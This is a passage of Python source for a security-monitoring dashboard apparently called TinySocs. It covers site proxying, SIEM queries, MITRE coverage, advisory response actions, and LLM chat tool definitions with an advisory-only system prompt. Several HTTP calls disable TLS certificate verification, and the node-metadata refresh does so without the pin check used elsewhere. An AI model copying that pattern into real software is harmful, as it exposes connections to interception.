    # Demo mode — delegate to per-site demo handlers (M4)
    if _DEMO_MODE:
        return _demo_site_proxy(node_id, path, dict(request.query_params))

    # Security: only proxy to allowed endpoint paths
    if path not in _PROXY_ALLOWED:
        return JSONResponse(status_code=404, content={"error": f"Unknown endpoint: /{path}"})

    # Look up the node URL
    url = _node_id_to_url.get(node_id)
    if url is None:
        # Cache may not be populated yet — try refreshing
        for node_url in _get_node_urls():
            try:
                import httpx as _hx
                resp = _hx.get(f"{node_url.rstrip('/')}/meta", timeout=3, verify=False)
                meta = resp.json()
                nid = meta.get("node_id", "")
                if nid:
                    _node_id_to_url[nid] = node_url
            except Exception:
                pass
        url = _node_id_to_url.get(node_id)

    # Fallback: the focus key may be a URL itself (unreachable sites have no node_id)
    if url is None and node_id.startswith(("https://", "http://")):
        if node_id.rstrip("/") in [u.rstrip("/") for u in _get_node_urls()]:
            url = node_id.rstrip("/")

    if url is None:
        return JSONResponse(status_code=404, content={"error": f"Unknown site: {node_id}"})

    # SECURITY: check pinned cert before proxying
    from tinysocs.federation_certs import verify_site_cert, load_pinned_certs as _lpc
    _pin_check = verify_site_cert(url)
    if _pin_check:
        print(f"[SECURITY] {_pin_check}", flush=True)
        return JSONResponse(status_code=403, content={
            "error": "SECURITY: certificate mismatch for this Site -- connection refused (possible MITM)"
        })

    # Forward the request
    qs = str(request.query_params)
    target = f"{url.rstrip('/')}/{path}" + (f"?{qs}" if qs else "")
    try:
        import httpx as _hx
        async with _hx.AsyncClient(verify=False, timeout=10.0) as client:
            resp = await client.get(target)
            return JSONResponse(status_code=resp.status_code, content=resp.json())
    except Exception as exc:
        return JSONResponse(status_code=502, content={"error": f"Site unreachable: {exc}"})


def _demo_site_proxy(node_id: str, path: str, params: dict) -> Any:
    """Phase 18 M4 — per-site demo data routing.

    Dispatches to per-site demo data generators based on node_id and path.
    """
    demo_sites = {"head-office", "branch-north", "warehouse"}
    if node_id not in demo_sites:
        return JSONResponse(status_code=404, content={"error": f"Unknown site: {node_id}"})
    if path not in _PROXY_ALLOWED:
        return JSONResponse(status_code=404, content={"error": f"Unknown endpoint: /{path}"})

    hours = int(params.get("hours", "24"))
    limit = int(params.get("limit", "50"))
    hostname = params.get("hostname", "")

    if path == "alerts/summary":
        return _demo_site_alerts_summary(node_id, hours)
    elif path == "alerts/timeline":
        return _demo_site_alerts_timeline(node_id, hours)
    elif path == "fleet/summary":
        hosts = _DEMO_SITE_HOSTS.get(node_id, [])
        return {
            "host_count": len(hosts),
            "total_events_24h": sum(h["events"] for h in hosts),
            "hosts": [{"hostname": h["hostname"],
                       "events_24h": h["events"],
                       "last_seen": _demo_iso(-0.02)} for h in hosts],
        }
    elif path == "fleet/health":
        return _demo_site_fleet_health(node_id)
    elif path == "detections/fired":
        return _demo_site_detections_fired(node_id, hours, limit)
    elif path == "events/recent":
        return _demo_site_events_recent(node_id, limit)
    elif path == "host/timeline":
        return _demo_site_host_timeline(node_id, hostname, hours)
    return JSONResponse(status_code=404, content={"error": f"Unknown endpoint: /{path}"})


# ---------------------------------------------------------------------------
# Version status API (Phase 15 M5)
# ---------------------------------------------------------------------------
@dashboard_app.get("/api/version/status")
async def api_version_status():
    """Return manifest data + fleet version comparison."""
    if _DEMO_MODE:
        return _demo_version_status()
    from tinysocs.reporting.version_check import (
        load_version_manifest,
        check_fleet_versions,
    )
    manifest = load_version_manifest()
    # Fetch fleet health for version comparison
    fleet_data = await api_fleet_health()
    hosts = fleet_data.get("hosts", [])
    fleet_versions = check_fleet_versions(hosts, manifest) if manifest else []
    # Build summary counts
    summary = {"current": 0, "outdated_minor": 0, "outdated_major": 0, "unknown": 0}
    for fv in fleet_versions:
        key = fv["status"].replace("-", "_")
        summary[key] = summary.get(key, 0) + 1
    return {
        "manifest": {k: v for k, v in manifest.items() if k != "_source_path"},
        "fleet_versions": fleet_versions,
        "summary": summary,
        "has_outdated": summary["outdated_minor"] + summary["outdated_major"] > 0,
    }


# ---------------------------------------------------------------------------
# MITRE ATT&CK Coverage API (Phase 15 M3)
# ---------------------------------------------------------------------------

@dashboard_app.get("/api/mitre/coverage")
async def api_mitre_coverage():
    """Return MITRE ATT&CK coverage summary from detection rules."""
    if _DEMO_MODE:
        return _demo_mitre_coverage()
    try:
        from tinysocs.reporting.mitre_coverage import (
            load_all_rules, extract_mitre_annotations, calculate_coverage,
        )
        rules = load_all_rules()
        annotations = extract_mitre_annotations(rules)
        coverage = calculate_coverage(annotations)
        return {"ok": True, **coverage}
    except Exception as exc:
        import traceback
        traceback.print_exc()
        # Return empty coverage instead of 500 so the widget renders gracefully
        return {
            "ok": True,
            "total_techniques": 0,
            "total_tactics": 0,
            "techniques": {},
            "tactic_summary": [],
            "rules_without_mitre": [],
            "error_detail": str(exc),
        }


@dashboard_app.get("/api/mitre/navigator-layer")
async def api_mitre_navigator_layer():
    """Download ATT&CK Navigator JSON layer."""
    if _DEMO_MODE:
        cov = _demo_mitre_coverage()
        # Build a minimal navigator layer from demo data
        layer = {
            "name": "TinySocs Coverage (Demo)", "versions": {"attack": "14", "layer": "4.5", "navigator": "4.9.1"},
            "domain": "enterprise-attack", "description": "TinySocs demo coverage",
            "techniques": [{"techniqueID": tid, "score": 1, "color": "#27ae60"} for tid in cov["techniques"]],
        }
        return Response(
            content=json.dumps(layer, indent=2), media_type="application/json",
            headers={"Content-Disposition": 'attachment; filename="tinysocs-navigator-layer.json"'},
        )
    try:
        from tinysocs.reporting.mitre_coverage import (
            load_all_rules, extract_mitre_annotations, calculate_coverage,
            generate_navigator_layer,
        )
        rules = load_all_rules()
        annotations = extract_mitre_annotations(rules)
        coverage = calculate_coverage(annotations)
        layer = generate_navigator_layer(coverage)
        return Response(
            content=json.dumps(layer, indent=2),
            media_type="application/json",
            headers={"Content-Disposition": 'attachment; filename="tinysocs-navigator-layer.json"'},
        )
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)})


@dashboard_app.get("/api/indices")
def api_indices():
    """Discover available indices and their field mappings."""
    import requests as _req
    try:
        import urllib3 as _u3
        _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
    except Exception:
        pass

    url = os.getenv("SIEM_URL", "https://localhost:9201")
    user = os.getenv("SIEM_USER", "admin")
    passwd = os.getenv("SIEM_PASS", "")
    verify = _resolve_ca_cert()

    indices_info: List[Dict[str, Any]] = []
    # Known index patterns
    known_patterns = ["tinysocs-winlog-*", "tinysocs-alerts-*"]

    for pattern in known_patterns:
        try:
            resp = _req.get(
                f"{url.rstrip('/')}/{pattern}/_mapping",
                auth=(user, passwd),
                verify=verify,
                timeout=10,
            )
            if resp.status_code == 200:
                mapping_data = resp.json()
                # Collect all field names across concrete indices
                all_fields: Dict[str, str] = {}
                for idx_name, idx_data in mapping_data.items():
                    props = idx_data.get("mappings", {}).get("properties", {})
                    _flatten_mapping(props, "", all_fields)

                ts_field = "timestamp" if "alerts" in pattern else "@timestamp"
                indices_info.append({
                    "pattern": pattern,
                    "concrete_indices": list(mapping_data.keys())[:10],
                    "ts_field": ts_field,
                    "fields": dict(sorted(all_fields.items())),
                    "field_count": len(all_fields),
                })
            elif resp.status_code == 404:
                indices_info.append({
                    "pattern": pattern,
                    "concrete_indices": [],
                    "ts_field": "timestamp" if "alerts" in pattern else "@timestamp",
                    "fields": {},
                    "field_count": 0,
                    "note": "No matching indices found",
                })
        except Exception as exc:
            indices_info.append({
                "pattern": pattern,
                "error": f"{type(exc).__name__}: {str(exc)[:200]}",
            })

    return {"indices": indices_info}


def _flatten_mapping(
    properties: Dict[str, Any], prefix: str, result: Dict[str, str]
) -> None:
    """Recursively flatten an OpenSearch mapping into dotted field names."""
    for field_name, field_meta in properties.items():
        full = f"{prefix}{field_name}" if not prefix else f"{prefix}.{field_name}"
        ftype = field_meta.get("type", "object")
        # Don't add 'object' placeholder types — only leaf types
        if ftype != "object":
            result[full] = ftype
        # Recurse into sub-properties
        sub_props = field_meta.get("properties")
        if sub_props:
            _flatten_mapping(sub_props, full, result)


@dashboard_app.get("/api/events/recent")
async def api_events_recent(
    limit: int = Query(50, ge=1, le=500),
    q: str = Query("", description="KQL filter"),
    index: str = Query("tinysocs-winlog-*", description="Index pattern"),
    time_range: str = Query("", description="Time range: 5m, 15m, 1h, 6h, 24h, 7d"),
):
    """Recent events from the specified index."""
    if _DEMO_MODE:
        return _demo_events_recent(limit)
    # Validate index pattern (allow known patterns only)
    allowed = ["tinysocs-winlog-*", "tinysocs-alerts-*"]
    if index not in allowed:
        index = "tinysocs-winlog-*"

    ts_field = _chat_ts_field(index)

    # Build query: combine text filter + optional time range
    text_q: Dict[str, Any] = {"match_all": {}} if not q else _chat_build_query(q, index)
    range_q: Optional[Dict[str, Any]] = None
    if time_range:
        tr_map = {"5m": "now-5m", "15m": "now-15m", "1h": "now-1h",
                  "6h": "now-6h", "24h": "now-24h", "7d": "now-7d"}
        gte_val = tr_map.get(time_range, "")
        if gte_val:
            range_q = {"range": {ts_field: {"gte": gte_val, "lte": "now"}}}

    if range_q and q:
        query = {"bool": {"must": [text_q, range_q]}}
    elif range_q:
        query = range_q
    else:
        query = text_q

    body: Dict[str, Any] = {
        "query": query,
        "sort": [{ts_field: {"order": "desc"}}],
    }
    resp = await _safe_query_async(index, body, size=limit)
    hits = resp.get("hits", {}).get("hits", [])
    events = []
    for h in hits:
        src = h.get("_source", {})
        if "alerts" in index:
            alert = src.get("alert", {})
            events.append({
                "timestamp": src.get("timestamp", ""),
                "host": src.get("source", {}).get("computer_name", ""),
                "channel": alert.get("rule_id", ""),
                "event_id": alert.get("severity", ""),
                "message": (alert.get("description", "") or alert.get("rule_name", ""))[:300],
            })
        else:
            events.append({
                "timestamp": src.get("@timestamp", ""),
                "channel": (src.get("winlog", {}) or {}).get("channel", ""),
                "event_id": (src.get("winlog", {}) or {}).get("event_id", src.get("event", {}).get("code", "")),
                "message": (src.get("message", "") or "")[:300],
                "host": (src.get("winlog", {}) or {}).get("computer_name", (src.get("agent", {}) or {}).get("hostname", "")),
            })
    # --- Fan-out: merge events from all remote nodes (All Sites view) ---
    if _get_node_urls():
        fan_params = {"limit": str(limit), "index": index}
        if q:
            fan_params["q"] = q
        if time_range:
            fan_params["time_range"] = time_range
        remote_results = await _fan_out_nodes("events/recent", fan_params)
        for rd in remote_results:
            events.extend(rd.get("events", []))
        # Re-sort merged events by timestamp (most recent first) and trim to limit
        events.sort(key=lambda e: e.get("timestamp", ""), reverse=True)
        events = events[:limit]

    return {"events": events, "total": len(events), "index": index, "error": resp.get("error")}


@dashboard_app.get("/api/actions")
def api_actions():
    """List guided response recommendations."""
    if _DEMO_MODE:
        return _demo_actions()
    try:
        from tinysocs.actions.executor import list_actions
        items = list_actions(limit=50)
        return {"actions": items}
    except Exception as exc:
        return {"actions": [], "error": str(exc)}


@dashboard_app.post("/api/actions/{action_id}/approve")
def api_action_approve(action_id: str):
    """Acknowledge a recommendation — operator will handle it manually."""
    if _DEMO_MODE:
        return {"ok": True, "action": {"action_id": action_id, "status": "acknowledged"}}
    try:
        from tinysocs.actions.executor import approve_action
        record = approve_action(action_id, approved_by="dashboard-operator")
        return {"ok": True, "action": record}
    except ValueError as exc:
        return JSONResponse(status_code=400, content={"ok": False, "error": str(exc)})
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)})


@dashboard_app.post("/api/actions/test")
def api_action_create_test():
    """Create a sample staged action for testing the approve/deny workflow."""
    try:
        from tinysocs.actions.executor import stage_action

        # Query for the most recent alert to base the action on
        body = {
            "query": {"range": {"timestamp": {"gte": "now-7d", "lte": "now"}}},
            "sort": [{"timestamp": {"order": "desc"}}],
        }
        resp = _safe_query("tinysocs-alerts-*", body, size=1)
        hits = resp.get("hits", {}).get("hits", [])

        if hits:
            src = hits[0].get("_source", {})
            alert = src.get("alert", {})
            host = src.get("source", {}).get("computer_name", "unknown-host")
            rule_name = alert.get("rule_name", alert.get("rule_id", "unknown-rule"))
            severity = alert.get("severity", "medium")
            params = {
                "ip": "10.0.0.99",
                "reason": f"Triggered by {rule_name} ({severity}) on {host}",
                "host": host,
                "rule": rule_name,
            }
            action_type = "block_ip" if severity in ("critical", "high") else "isolate_host"
        else:
            params = {
                "ip": "192.168.1.42",
                "reason": "Test action — suspicious outbound traffic to known C2",
                "host": "WORKSTATION-01",
                "rule": "test_rule",
            }
            action_type = "block_ip"

        record = stage_action(
            action=action_type,
            params=params,
            who="dashboard-test",
            dry_run=True,
        )
        return {"ok": True, "action": record, "message": f"Test action staged: {action_type}"}
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)})


@dashboard_app.post("/api/actions/{action_id}/reject")
def api_action_reject(action_id: str):
    """Dismiss a recommendation — false positive or not applicable."""
    if _DEMO_MODE:
        return {"ok": True, "action": {"action_id": action_id, "status": "dismissed"}}
    try:
        from tinysocs.actions.executor import reject_action
        record = reject_action(action_id, rejected_by="dashboard-operator")
        return {"ok": True, "action": record}
    except ValueError as exc:
        return JSONResponse(status_code=400, content={"ok": False, "error": str(exc)})
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)})


# ---------------------------------------------------------------------------
# Dashboard-local tool dispatcher for LLM chat
# Uses the dashboard's _os_query() (requests-based) instead of the opensearchpy
# SDK client, which can fail on TLS with self-signed DER certs on Windows.
# ---------------------------------------------------------------------------
_CHAT_ALLOW_INDICES = ["tinysocs-winlog-*", "tinysocs-alerts-*"]

# Tool definitions in Anthropic format (local copy — avoids importing llm_claude.py
# which transitively pulls in opensearchpy and may fail)
_CHAT_TOOLS_ANTHROPIC = [
    {
        "name": "search_kql",
        "description": "Search SIEM with KQL over a given index",
        "input_schema": {
            "type": "object",
            "properties": {
                "index": {"type": "string", "description": "Index pattern to search"},
                "kql": {"type": "string", "description": "KQL query string"},
                "size": {"type": "integer", "description": "Max results", "default": 100},
            },
            "required": ["index", "kql"],
        },
    },
    {
        "name": "aggregate",
        "description": "Run an Elasticsearch/OpenSearch DSL aggregation",
        "input_schema": {
            "type": "object",
            "properties": {
                "index": {"type": "string", "description": "Index pattern"},
                "dsl": {"type": "object", "description": "DSL aggregation body"},
            },
            "required": ["index", "dsl"],
        },
    },
    {
        "name": "propose_rule",
        "description": "Suggest a detection rule (design only; does not install)",
        "input_schema": {
            "type": "object",
            "properties": {
                "rule_id": {"type": "string"},
                "query": {"type": "string"},
                "schedule": {"type": "string", "default": "15m"},
            },
            "required": ["rule_id", "query"],
        },
    },
    {
        "name": "stage_action",
        "description": "Recommend a guided response action for the operator. Does NOT execute anything — generates a runbook for the operator to follow manually.",
        "input_schema": {
            "type": "object",
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["block_ip", "disable_user", "isolate_host", "open_ticket"],
                    "description": "Type of response to recommend",
                },
                "params": {
                    "type": "object",
                    "description": "Parameters like ip, host, user, reason",
                },
            },
            "required": ["action", "params"],
        },
    },
]

# Same tools in OpenAI function-calling format
_CHAT_TOOLS_OPENAI = [
    {
        "type": "function",
        "function": {
            "name": t["name"],
            "description": t["description"],
            "parameters": t["input_schema"],
        },
    }
    for t in _CHAT_TOOLS_ANTHROPIC
]


def _chat_index_allowed(idx: str) -> bool:
    from fnmatch import fnmatch
    return any(fnmatch(idx or "", pat) for pat in _CHAT_ALLOW_INDICES)


def _privacy_mask_result(result: Dict[str, Any]) -> Dict[str, Any]:
    """Apply privacy masking to tool results before sending to external LLM."""
    try:
        from tinysocs.agent.privacy import coarse_mask
        masked = json.loads(coarse_mask(json.dumps(result)))
        return masked
    except Exception:
        return result


def _chat_call_tool(name: str, args: Dict[str, Any]) -> Dict[str, Any]:
    """Execute a tool call using the dashboard's own SIEM connection."""
    args = dict(args or {})
    default_index = _CHAT_ALLOW_INDICES[0]

    # Sanitize index for search/aggregate tools
    if name in ("search_kql", "aggregate"):
        idx = args.get("index") or default_index
        if not _chat_index_allowed(idx):
            args["index"] = default_index

    try:
        if name == "search_kql":
            return _chat_tool_search_kql(args)
        if name == "aggregate":
            return _chat_tool_aggregate(args)
        if name == "propose_rule":
            return {
                "ok": True,
                "proposal": {
                    "id": args.get("rule_id", ""),
                    "query": args.get("query", ""),
                    "schedule": args.get("schedule", "15m"),
                    "note": "Design-only; not installed",
                },
            }
        if name == "stage_action":
            return {
                "ok": True,
                "staged": True,
                "action": args.get("action", ""),
                "params": args.get("params", {}),
                "note": "Recommendation staged for operator review. TinySocs does not execute actions — the operator will follow the runbook steps manually.",
            }
        return {"error": f"unknown tool {name}"}
    except Exception as e:
        return {"error": str(e), "tool": name}


def _chat_call_tool_masked(name: str, args: Dict[str, Any]) -> Dict[str, Any]:
    """Execute a tool and apply privacy masking to the result."""
    result = _chat_call_tool(name, args)
    return _privacy_mask_result(result)


def _chat_ts_field(index: str) -> str:
    """Return the correct timestamp field name for the given index pattern.

    tinysocs-alerts-* uses 'timestamp', everything else uses '@timestamp'.
    """
    return "timestamp" if "alerts" in (index or "") else "@timestamp"


def _chat_build_query(kql: str, index: str = "") -> Dict[str, Any]:
    """Convert a KQL-like string into an OpenSearch DSL query.

    Handles:
      @timestamp >= now()-1d                  →  range filter
      field:value AND @timestamp >= now-1d    →  bool(must=[query_string, range])
      @timestamp >= '2026-02-16T...' AND ...  →  bool(must=[query_string, range])
      *                                       →  match_all
      field:value                             →  query_string
    """
    import re
    kql = (kql or "*").strip()
    ts_field = _chat_ts_field(index)

    # Fix common field-name mistakes from LLMs — expand short names to nested paths.
    _ALERT_ALIASES = {
        "rule_id:": "alert.rule_id:",
        "rule_name:": "alert.rule_name:",
        "severity:": "alert.severity:",
        "description:": "alert.description:",
        "event_count:": "alert.event_count:",
    }
    _WINLOG_ALIASES = {
        "event_id:": "winlog.event_id:",
        "channel:": "winlog.channel:",
    }
    # computer_name alias depends on the index
    is_alert_idx = "alert" in index.lower() if index else False
    if is_alert_idx:
        aliases = {**_ALERT_ALIASES, "computer_name:": "source.computer_name:"}
    else:
        aliases = {**_WINLOG_ALIASES, "computer_name:": "winlog.computer_name:"}
    for short, full in aliases.items():
        # Only replace bare short names that aren't already prefixed
        # e.g. replace "rule_id:" but not "alert.rule_id:"
        if short in kql and full not in kql:
            kql = kql.replace(short, full)

    if kql in ("*", ""):
        return {"match_all": {}}

    # Pattern to match timestamp range clauses anywhere in the KQL:
    #   @timestamp >= now-1d
    #   timestamp >= now()-7d
    #   @timestamp >= '2026-02-16T16:25:03'
    #   @timestamp <= '2026-02-16T16:35:03'
    ts_clause_re = re.compile(
        r"""(?:AND\s+)?@?timestamp\s*(>=?|<=?)\s*['"]*"""
        r"""(now(?:\(\))?(?:[/\-+]\w+)*|[\dT:.Z\-]+)['"]*"""
        r"""(?:\s+AND)?""",
        re.IGNORECASE,
    )

    range_filters: Dict[str, Any] = {}
    remaining_kql = kql

    for m in ts_clause_re.finditer(kql):
        op = m.group(1)
        val = m.group(2).replace("()", "")
        if val.lower() in ("today", "now/d"):
            val = "now/d"
        # Map operator to range DSL key
        if op == ">=":
            range_filters["gte"] = val
        elif op == ">":
            range_filters["gt"] = val
        elif op == "<=":
            range_filters["lte"] = val
        elif op == "<":
            range_filters["lt"] = val
        # Remove the matched clause from the remaining KQL
        remaining_kql = remaining_kql.replace(m.group(0), "")

    # Clean up leftover AND/whitespace from removal
    remaining_kql = re.sub(r'^\s*AND\s+', '', remaining_kql.strip(), flags=re.IGNORECASE)
    remaining_kql = re.sub(r'\s+AND\s*$', '', remaining_kql.strip(), flags=re.IGNORECASE)
    remaining_kql = re.sub(r'\s+AND\s+AND\s+', ' AND ', remaining_kql.strip(), flags=re.IGNORECASE)
    remaining_kql = remaining_kql.strip()

    # Build the query parts
    parts: list = []

    if range_filters:
        parts.append({"range": {ts_field: range_filters}})

    if remaining_kql and remaining_kql != "*":
        parts.append({"query_string": {"query": remaining_kql, "default_operator": "AND"}})

    if not parts:
        return {"match_all": {}}
    if len(parts) == 1:
        return parts[0]
    return {"bool": {"must": parts}}


def _chat_tool_search_kql(args: Dict[str, Any]) -> Dict[str, Any]:
    """Search SIEM using the dashboard's requests-based _safe_query()."""
    index = args.get("index", "tinysocs-winlog-*")
    kql = args.get("kql", "*")
    size = min(int(args.get("size", 100)), 500)
    ts_field = _chat_ts_field(index)

    # ── Demo mode: return synthetic docs instead of hitting OpenSearch ──
    if _DEMO_MODE:
        if "alerts" in index:
            d = _demo_detections_fired(24, size or 50)
            docs = d.get("detections", [])
            return {"ok": True, "hits": docs[:size] if size else docs, "count": len(docs), "total": d.get("total", len(docs)), "index": index}
        else:
            d = _demo_events_recent(size or 20)
            docs = d.get("events", [])
            if size == 0:
                return {"ok": True, "total": d.get("total", len(docs)), "index": index}
            return {"ok": True, "hits": docs[:size], "count": len(docs), "total": d.get("total", len(docs)), "index": index}

    query = _chat_build_query(kql, index)

    if size == 0:
        # Count-only query
        body: Dict[str, Any] = {"query": query, "track_total_hits": True}
        resp = _safe_query(index, body, size=0)
        if resp.get("error"):
            return {"ok": False, "error": resp["error"], "index": index}
        total_hit = resp.get("hits", {}).get("total", 0)
        total = total_hit.get("value", 0) if isinstance(total_hit, dict) else int(total_hit)
        return {"ok": True, "total": total, "index": index}

    # Doc fetch — use the right timestamp field for sorting
    body = {"query": query, "sort": [{ts_field: {"order": "desc"}}]}
    resp = _safe_query(index, body, size=size)
    if resp.get("error"):
        return {"ok": False, "error": resp["error"], "index": index}
    hits = resp.get("hits", {}).get("hits", [])
    docs = [h.get("_source", {}) for h in hits]
    total_hit = resp.get("hits", {}).get("total", 0)
    total = total_hit.get("value", 0) if isinstance(total_hit, dict) else int(total_hit)
    return {"ok": True, "hits": docs[:size], "count": len(docs), "total": total, "index": index}


def _chat_tool_aggregate(args: Dict[str, Any]) -> Dict[str, Any]:
    """Run aggregation using the dashboard's requests-based connection."""
    index = args.get("index", "tinysocs-winlog-*")
    dsl = args.get("dsl") or {}
    ts_field = _chat_ts_field(index)

    # ── Demo mode: return synthetic aggregation results ──
    if _DEMO_MODE:
        if "alerts" in index:
            summary = _demo_alerts_summary(24)
            return {
                "ok": True, "total": summary["total"], "index": index,
                "aggregations": {
                    "severity_breakdown": {"buckets": [{"key": k, "doc_count": v} for k, v in summary["severity"].items()]},
                    "top_hosts": {"buckets": [{"key": h["host"], "doc_count": h["count"]} for h in summary["top_hosts"]]},
                    "top_rules": {"buckets": [{"key": r["rule"], "doc_count": r["count"]} for r in summary["top_rules"]]},
                },
            }
        else:
            events = _demo_events_recent(200)
            total = events.get("total", len(events.get("events", [])))
            return {
                "ok": True, "total": total, "index": index,
                "aggregations": {
                    "total_count": {"value": total},
                    "by_host": {"buckets": [{"key": "RECEPTION-PC", "doc_count": 45}, {"key": "FILESERVER-01", "doc_count": 32}, {"key": "DC-01", "doc_count": 28}]},
                    "by_channel": {"buckets": [{"key": "Security", "doc_count": 62}, {"key": "Microsoft-Windows-Sysmon/Operational", "doc_count": 28}, {"key": "TinySocs-FIM", "doc_count": 15}]},
                },
            }

    # If no aggs provided, build a sensible default: count docs in last 24h
    if not dsl or not dsl.get("aggs"):
        dsl = {
            "query": {"range": {ts_field: {"gte": "now-24h", "lte": "now"}}},
            "aggs": {
                "total_count": {"value_count": {"field": ts_field}},
            },
        }

    # Use _safe_query which handles errors gracefully
    resp = _safe_query(index, dsl, size=0)
    if resp.get("error"):
        return {"ok": False, "error": resp["error"], "index": index}
    aggs = resp.get("aggregations", {})
    total_hit = resp.get("hits", {}).get("total", 0)
    total = total_hit.get("value", 0) if isinstance(total_hit, dict) else int(total_hit)
    return {"ok": True, "total": total, "aggregations": aggs, "index": index}


@dashboard_app.get("/api/chat/sessions")
def api_chat_sessions():
    """List available chat sessions with preview of last message."""
    _init_chat_session_file()
    sessions = []
    for sid, msgs in _chat_sessions.items():
        if not msgs:
            continue
        last_msg = msgs[-1].get("content", "") if msgs else ""
        if isinstance(last_msg, list):
            last_msg = " ".join(b.get("text", "") for b in last_msg if isinstance(b, dict))
        sessions.append({
            "session_id": sid,
            "message_count": len(msgs),
            "preview": (last_msg[:80] + "...") if len(last_msg) > 80 else last_msg,
        })
    return {"sessions": sessions}


@dashboard_app.get("/api/chat/history")
def api_chat_history(session_id: str = Query(...)):
    """Retrieve chat history for a specific session (user + assistant messages only)."""
    _init_chat_session_file()
    msgs = _chat_sessions.get(session_id, [])
    display = []
    for m in msgs:
        role = m.get("role", "")
        if role not in ("user", "assistant"):
            continue
        content = m.get("content", "")
        if isinstance(content, list):
            content = " ".join(b.get("text", "") for b in content if isinstance(b, dict) and b.get("type") == "text")
        if content:
            display.append({"role": role, "content": content})
    return {"session_id": session_id, "messages": display}


def _chat_get_environment_context() -> str:
    """Query OpenSearch for known hosts and recent alert summary to give the LLM context."""
    parts: list[str] = []
    try:
        # Get known hostnames from alerts (last 24h)
        host_body: Dict[str, Any] = {
            "query": {"range": {"timestamp": {"gte": "now-24h", "lte": "now"}}},
            "aggs": {
                "hosts": {"terms": {"field": "source.computer_name.keyword", "size": 20}},
                "by_severity": {"terms": {"field": "alert.severity", "size": 10}},
            },
        }
        alert_resp = _safe_query("tinysocs-alerts-*", host_body)
        if not alert_resp.get("error"):
            total = alert_resp.get("hits", {}).get("total", {})
            alert_count = total.get("value", 0) if isinstance(total, dict) else int(total)

            host_buckets = alert_resp.get("aggregations", {}).get("hosts", {}).get("buckets", [])
            hosts = [b["key"] for b in host_buckets if b.get("key")]

            sev_buckets = alert_resp.get("aggregations", {}).get("by_severity", {}).get("buckets", [])
            sev_map = {b["key"].lower(): b["doc_count"] for b in sev_buckets}

            if hosts:
                parts.append(f"Monitored hosts: {', '.join(hosts)}")
            if alert_count:
                sev_parts = []
                for s in ("critical", "high", "medium", "low"):
                    if sev_map.get(s):
                        sev_parts.append(f"{sev_map[s]} {s}")
                sev_str = f" ({', '.join(sev_parts)})" if sev_parts else ""
                parts.append(f"Alerts in last 24h: {alert_count}{sev_str}")

        # Get known hostnames from winlog
        winlog_body: Dict[str, Any] = {
            "query": {"range": {"@timestamp": {"gte": "now-24h", "lte": "now"}}},
            "aggs": {"hosts": {"terms": {"field": "winlog.computer_name", "size": 20}}},
        }
        winlog_resp = _safe_query("tinysocs-winlog-*", winlog_body)
        if not winlog_resp.get("error"):
            wl_buckets = winlog_resp.get("aggregations", {}).get("hosts", {}).get("buckets", [])
            wl_hosts = [b["key"] for b in wl_buckets if b.get("key")]
            # Merge with alert hosts (dedupe)
            all_hosts = list(dict.fromkeys(hosts + wl_hosts)) if hosts else wl_hosts
            if all_hosts and not hosts:
                parts.append(f"Monitored hosts (winlog): {', '.join(all_hosts)}")
            elif wl_hosts:
                extra = [h for h in wl_hosts if h not in hosts]
                if extra:
                    parts.append(f"Additional winlog hosts: {', '.join(extra)}")

    except Exception:
        pass  # Non-fatal — chat works without context

    ctx = "\n".join(parts)
    try:
        from tinysocs.agent.privacy import coarse_mask
        ctx = coarse_mask(ctx)
    except Exception:
        pass
    return ctx


@dashboard_app.get("/api/settings/llm-mode")
def api_llm_mode():
    """Return the current LLM mode (no auth required — used for consent prompt)."""
    mode = os.getenv("LLM_MODE", "offline").strip().lower()
    provider_labels = {
        "anthropic": "Anthropic (Claude)",
        "openai": "OpenAI",
        "ollama": "Ollama (local)",
        "offline": "Offline",
    }
    return {
        "mode": mode,
        "label": provider_labels.get(mode, mode),
        "is_cloud": mode in ("anthropic", "openai"),
    }


@dashboard_app.post("/api/chat")
def api_chat(body: Dict[str, Any] = Body(...)):
    """Chat with the TinySocs assistant (multi-LLM with tool-calling).

    Routes to Anthropic Claude or OpenAI based on LLM_MODE env var.
    Falls back to a simple offline response when no API key is configured.
    """
    _init_chat_session_file()  # Ensure sessions are loaded from disk
    user_message = (body.get("message") or "").strip()
    session_id = body.get("session_id") or str(uuid.uuid4())[:12]

    if not user_message:
        return JSONResponse(status_code=400, content={"error": "Empty message"})

    llm_mode = os.getenv("LLM_MODE", "openai").strip().lower()

    system_text = (
        "You are TinySocs Assistant — a friendly, helpful security guide.\n"
        "Your users may NOT be technical. Explain things in plain, simple language.\n"
        "Avoid jargon. Never list Event IDs or tell users to 'check logs' themselves — "
        "YOU do the searching and summarise what you find in everyday words.\n\n"

        "PERSONALITY:\n"
        "- Warm, reassuring, conversational. Not robotic or overly formal.\n"
        "- Keep responses SHORT — 2-4 short paragraphs max. Use bullet points sparingly.\n"
        "- When investigating, DO the work: search logs, read results, then explain findings.\n"
        "- Don't dump raw data or technical field names at the user.\n"
        "- If you find nothing, say so simply and offer to broaden the search.\n"
        "- End with a simple question like 'Want me to dig deeper?' — not a numbered action list.\n\n"

        "BE PROACTIVE:\n"
        "- When asked about an alert, AUTOMATICALLY search related logs (broaden time by ±30 minutes).\n"
        "- Don't just describe the alert metadata — look up what actually happened.\n"
        "- If a narrow search returns nothing, immediately try a broader search before responding.\n"
        "- Combine alert data + winlog data to tell the full story.\n\n"

        "ADVISORY ONLY:\n"
        "TinySocs advises but NEVER executes actions on hosts or networks. When you recommend "
        "a response (stage_action), it creates a guided response with step-by-step instructions "
        "for the operator. You advise — the human decides and acts.\n\n"

        "TOOL REFERENCE (internal — do not expose to user):\n"
        "- tinysocs-alerts-*: timestamp field 'timestamp'.\n"
        "  IMPORTANT: All alert fields are NESTED — you MUST use the full path:\n"
        "    alert.rule_id, alert.rule_name, alert.severity, alert.description,\n"
        "    alert.event_count, source.computer_name\n"
        "  WRONG: rule_id:\"TS-030\"  CORRECT: alert.rule_id:\"TS-030\"\n"
        "  WRONG: severity:\"high\"   CORRECT: alert.severity:\"high\"\n"
        "  WRONG: computer_name:X    CORRECT: source.computer_name:X\n\n"
        "- tinysocs-winlog-*: timestamp field '@timestamp'.\n"
        "  IMPORTANT: Winlog fields are NESTED — you MUST use the full path:\n"
